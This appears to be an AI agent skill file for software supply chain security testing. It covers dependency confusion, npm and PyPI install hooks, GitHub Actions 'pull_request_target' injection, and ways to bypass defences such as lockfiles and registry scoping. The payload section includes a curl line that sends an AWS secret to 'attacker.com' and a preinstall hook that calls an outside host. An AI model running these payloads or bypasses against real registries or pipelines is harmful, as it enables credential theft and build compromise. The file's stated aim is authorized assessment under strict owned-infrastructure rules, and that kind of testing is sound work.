---
name: s-supply-chain
description: Unified Software Supply Chain Security skill linking hack-skills methodology with AboutSecurity execution resources. Covers dependency confusion, package typosquatting, CI/CD pipeline attacks, NPM/PyPI/Maven repository poisoning, and build artifact tampering.
---

# Unified Software Supply Chain Security

## When To Use

Use for dependency confusion attacks, package repository reconnaissance, CI/CD pipeline security assessment, build chain analysis, GitHub Actions/workflow injection, and container image supply chain attacks.

## Source Priority

| Task Type | Primary Source |
|---|---|
| Methodology | hack-skills |
| Execution | AboutSecurity |
| Ctf | AboutSecurity |
| Bug Bounty | hack-skills |
| Resources | AboutSecurity |

## Source Strategy

- Use hack-skills for methodology, scenario classification, domain coverage and deeper playbooks.
- Use AboutSecurity for execution constraints, mandatory rules, payload files, dictionaries, tool YAML configs, CTF and K8s fine-grained resources.
- Do not duplicate upstream content here. Load upstream files when needed.

## Recommended Loading Order

### High-Level Analysis

1. Read matched hack-skills files first unless Source Priority says otherwise.
2. Then read matched AboutSecurity files for constraints and execution details.

### Execution

1. Read matched AboutSecurity skill files first.
2. Check related Tools YAML.
3. Check related Payload/Dic/Doc files.
4. Fall back to hack-skills for scenario variants and methodology.

### CTF

1. Prefer AboutSecurity when this topic has matching AboutSecurity skills/resources.
2. Use hack-skills for broader theory or missing coverage.

### Bug Bounty / Authorized Assessment

1. Prefer hack-skills methodology and scenario files.
2. Use AboutSecurity tools/resources for execution support.

## Conflict Resolution

1. Safety and authorization rules always have highest priority.
2. AboutSecurity `NEVER`, `ALWAYS`, `禁止`, `必须`, `⛔` rules override general methodology during execution.
3. hack-skills is preferred for scenario classification, knowledge depth and real-world methodology.
4. AboutSecurity is preferred for tools, payloads, dictionaries, CTF and automated execution constraints.
5. For CTF tasks, prefer AboutSecurity unless this topic is mainly covered by hack-skills.
6. For bug bounty or authorized assessment, prefer hack-skills for strategy and AboutSecurity for resources.

## Matched hack-skills Skills

- `../../security-sources/hack-skills/skills/dependency-confusion/SKILL.md` — SKILL: Dependency Confusion — Expert Attack Playbook

## Matched AboutSecurity Skills

- `../../security-sources/AboutSecurity/skills/exploit/advanced/supply-chain-attack/SKILL.md` — 软件供应链攻击方法论
- `../../security-sources/AboutSecurity/skills/exploit/advanced/supply-chain-audit/SKILL.md` — 软件供应链审计方法论

## Related AboutSecurity Tools

- No match found.

## Related AboutSecurity Payloads

- No match found.

## Related AboutSecurity Dictionaries

- No match found.

## Related AboutSecurity Docs

- No match found.

## References

See `references/SOURCES.md`.

## Vulnerability Testing Output Template

When you discover a potential supply chain vulnerability and begin active testing, ⛔ **MUST** structure findings using this fixed 4-module output template.

### Module 1: 测试思路 (Testing Approach)
- Describe the supply chain context: package manager (NPM/PyPI/Maven/Gradle/NuGet/Go Modules/Cargo), CI/CD platform (GitHub Actions/GitLab CI/Jenkins/CircleCI), deployment pipeline (Docker/K8s/Serverless)
- Classify the attack type: dependency confusion (private package name → public registry), typosquatting (similar name), package hijacking (unmaintained package takeover), CI/CD workflow injection (pull_request_target), build artifact tampering, container image poisoning
- Document the decision tree: package list extraction (`package.json`/`requirements.txt`/`pom.xml`) → identify private/internal packages → check public registry availability → CI/CD config analysis (`.github/workflows/`) → injection point identification → controlled proof-of-concept
- State expected success indicator: private package installable from public registry, CI/CD workflow code execution, or build artifact modified

### Module 0: 防护探测 filter_probe（⛔ 必须先于 payload）

对供应链进行探测：
- 扫描 `package.json` / `requirements.txt` / `pom.xml` — 列出所有依赖
- 识别私有包名（`@company/package` / `company-package` 等命名模式）
- 在 `npmjs.com` / `pypi.org` 上搜索这些包名 — 是否已存在
- 检查 `.npmrc` / `pip.conf` — 私有 registry 配置情况
- 检查 `.github/workflows/*.yml` — 是否使用了 `pull_request_target`

每个单独测试，记入 `{操作: [发现, 风险]}`。

> 编号化测试要点见 `knowledge/test-checkpoints.md` — **SC001~003**。
> ⛔ 依赖混淆攻击必须使用自有受控包名注册进行验证，不可注册与目标私有包同名但含恶意代码的包。

### Module 2: 关键技巧 (Key Techniques)
- List 2-4 non-obvious technical details:
  - **Dependency confusion via version priority**: NPM installs the highest version matching `package.json` semver range — if the private package `@company/foo` v1.0.0 exists internally, publish v99.0.0 to public NPM and `npm install` picks the public one due to higher version priority
  - **`pull_request_target` workflow injection**: `pull_request_target` runs in the context of the base repository (not the fork) with access to secrets — a malicious PR can modify the workflow itself or inject code in build scripts that run with full secret access
  - **GitHub Actions `GITHUB_TOKEN` abuse**: even with `permissions: read`, the token can be used to approve PRs, create releases, or read other repositories in the same org — script injection in a workflow gives access to this token
  - **PyPI `.whl` preinstall script**: Python wheels can include a `setup.py` post-install hook, and `pip` runs `setup.py` even for `--no-deps` — a malicious package executes code on `pip install` without user interaction

### Module 3: Payload字典 (Payload Dictionary)
- ⛔ Provide minimum 3 payloads organized by scenario:
  1. **Dependency confusion PoC**: publish empty package to public registry with same name as private package, version 99.0.0, `preinstall` script that does DNS callback → verify target fetches public package
  2. **CI/CD injection via PR**: fork → modify `.github/workflows/ci.yml` to add `run: curl http://attacker.com/${{ secrets.AWS_ACCESS_KEY_ID }}` → submit PR → if `pull_request_target` triggers, secrets leak in DNS/callback
  3. **NPM lifecycle script PoC**: `"scripts": {"preinstall": "curl http://collaborator.oastify.com/$(hostname)"}` in `package.json` → executed on `npm install`
- Each entry format: `[Ecosystem / Attack Type] <PoC steps>` → expected behavior
- ⛔ Never exfiltrate or store real secrets from authorized targets — use DNS callback confirmation only.

### Module 4: 绕过方法 (Bypass Methods)
- Anticipate defensive measures and provide counter-strategies:
  1. **Private registry scope bypass**: when `.npmrc` has `@company:registry=https://npm.company.com`, dependency confusion is blocked for scoped packages only — but unscoped internal packages (e.g. `company-utils` not `@company/utils`) are unprotected
  2. **Version pinning bypass**: `package-lock.json` pins versions but `npm install <new-package>` or `npm update` re-resolves — CI/CD pipelines doing fresh `npm install` with floating `^1.0.0` ranges are vulnerable
  3. **Artifact integrity bypass**: `package-lock.json` has `integrity` hashes → but `pip` by default does NOT verify hashes for PyPI packages unless `--require-hashes` is explicitly used; similarly, `go.sum` can be bypassed by `GONOSUMCHECK` env var
  4. **CI/CD runner isolation bypass**: `runs-on: self-hosted` on public repositories — any PR author can run code on the org's self-hosted runner, gaining access to the internal network that the runner sits in

## Important Agent Rules

- Do not treat this bridge file as the full knowledge source.
- Always load the matched upstream files needed for the task.
- Preserve and obey upstream mandatory execution rules.
- ⛔ Supply chain attack validation must use OWNED infrastructure only — never publish packages impersonating real brands to public registries.
- ⛔ Dependency confusion PoC: register an empty/placeholder package, do NOT include malicious code.
- Only operate in authorized environments.
